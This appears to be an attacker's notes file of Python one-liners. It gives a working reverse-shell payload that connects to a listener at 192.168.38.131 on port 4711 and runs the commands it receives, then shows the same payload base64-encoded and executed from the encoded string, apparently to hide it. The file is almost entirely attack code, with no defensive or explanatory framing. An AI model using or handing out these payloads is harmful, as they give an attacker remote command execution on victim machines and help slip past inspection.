#!/usr/bin/env python

#1: 1-liner python code to execute shell on remote host when listening with nc on 192.168.38.131 with local port 4711
python -c "exec(\"import socket, subprocess;s = socket.socket();s.connect(('192.168.38.131',4711))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"

#encoding code with base 64
shell = "import socket, subprocess;s = socket.socket();s.connect(('192.168.38.131',4711))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())".encode('base64')

#decoding code with base 64
python -c "exec('aW1wb3J0IHNvY2tldCwgc3VicHJvY2VzcztzID0gc29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgo JzE5Mi4xNjguMzguMTMxJyw0NzExKSkKd2hpbGUgMTogIHByb2MgPSBzdWJwcm9jZXNzLlBvcGVu KHMucmVjdigxMDI0KSwgc2hlbGw9VHJ1ZSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJy PXN1YnByb2Nlc3MuUElQRSwgc3RkaW49c3VicHJvY2Vzcy5QSVBFKTtzLnNlbmQocHJvYy5zdGRv dXQucmVhZCgpK3Byb2Muc3RkZXJyLnJlYWQoKSk=\n'.decode('base64'))"


